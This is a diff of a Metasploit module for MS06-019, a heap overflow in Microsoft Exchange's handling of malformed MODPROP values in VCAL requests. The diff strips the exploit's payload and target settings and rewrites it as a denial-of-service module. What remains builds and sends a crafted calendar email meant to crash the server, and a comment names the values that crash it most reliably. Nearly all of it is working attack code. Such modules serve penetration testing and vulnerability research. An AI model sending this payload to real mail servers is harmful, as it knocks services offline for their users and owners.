@@ -14,7 +14,7 @@ require 'msf/core'
 
 module Msf
 
-class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Exploit::Remote
+class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Auxiliary
 
 	include Exploit::Remote::Smtp
 
@@ -22,7 +22,7 @@ class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Exploit::Remote
 		super(update_info(info,	
 			'Name'           => 'MS06-019 Exchange MODPROP Heap Overflow',
 			'Description'    => %q{
-				This module exploits a heap overflow vulnerability in MS
+				This module triggers a heap overflow vulnerability in MS
 				Exchange that occurs when multiple malformed MODPROP values
 				occur in a VCAL request.
 			},
@@ -36,39 +36,28 @@ class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Exploit::Remote
 					[ 'MSB', 'MS06-019'],
 
 				],
-			'Privileged'     => true,
-			'DefaultOptions' => 
-				{
-					'EXITFUNC'  => 'thread',
-					'SUBJECT'	=> 're: Your Brains',
-				},
-			'Payload'        =>
-				{
-					'Space'    => 614,	# XXX
-					'EncoderOptions' =>
-						{
-							'BufferRegister' => 'EDX',
-						}
-				},
-			'Platform'       => 'win',
-			'Targets'        => 
-				[
-					# alphanum rets :(, will look more into it later
-					['Windows 2003 SP0 English', { 'Platform' => 'win', 'Ret' => 0x77364650 }],
-				],
-			'DisclosureDate' => 'Nov 12 2004',
-			'DefaultTarget' => 0))
+			'DisclosureDate' => 'Nov 12 2004'))
+
+		register_options(
+			[
+				OptString.new('SUBJECT', [ true, 'The subject of the e-mail', 're: Your Brains'])
+			], self.class)
+						
 	end
 
-	def exploit
-		print "Connected; Sending mail... "
+	#
+	# This needs some reworking to use the SMTPDeliver mixin and the Re::MIME class
+	#
+	def run
+	
+		connect_login
 
 		modprops = ['attendee', 'categories', 'class', 'created', 'description', 
 					'dtstamp', 'duration', 'last-modified', 
 					'location', 'organizer', 'priority', 'recurrence-id', 'sequence',
 					'status', 'summary', 'transp', 'uid']
 		
-					#modprops = ['dtstamp']
+		#modprops = ['dtstamp']
 		
 		modpropshort =	""
 		modpropbusted =	""
@@ -88,15 +77,15 @@ class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Exploit::Remote
 			modproplong << modprops[rand(modprops.size)] + ","
 		}
 
-		boundry =	rand_text_alphanumeric(8) + "." + rand_text_alphanumeric(8)
+		boundry = rand_text_alphanumeric(8) + "." + rand_text_alphanumeric(8)
 
 	
 		# Really, the randomization above only crashes /sometimes/ - it's MUCH more
 		# reliable, and gives crashes in better spots of you use these modprops:
 
-		modpropshort =	"dtstamp,"
-		modproplong =	"dtstamp, dtstamp,"
-		modpropbusted =	"DTSTAMP:\r\n"
+		modpropshort  = "dtstamp,"
+		modproplong   = "dtstamp, dtstamp,"
+		modpropbusted = "DTSTAMP:\r\n"
 		
 		mail =		"From: #{datastore['MAILFROM']}\r\n"
 		mail <<		"To: #{datastore['MAILTO']}\r\n"
@@ -122,11 +111,9 @@ class Auxiliary::Dos::Windows::Smtp::MS06_019_EXCHANGE < Msf::Exploit::Remote
 		mail <<		"END:VCALENDAR\r\n"
 		mail <<		"\r\n--#{boundry}\r\n"
 		mail <<		"\r\n.\r\n"
-	
-		print "\n\n" + mail + "\n\n"
 		
-		handler
-		connect_login
+	
+		print_status("Sending message...")	
 		sock.put(mail)
 		sock.put("QUIT\r\n")
 		print "<< " + sock.get_once 
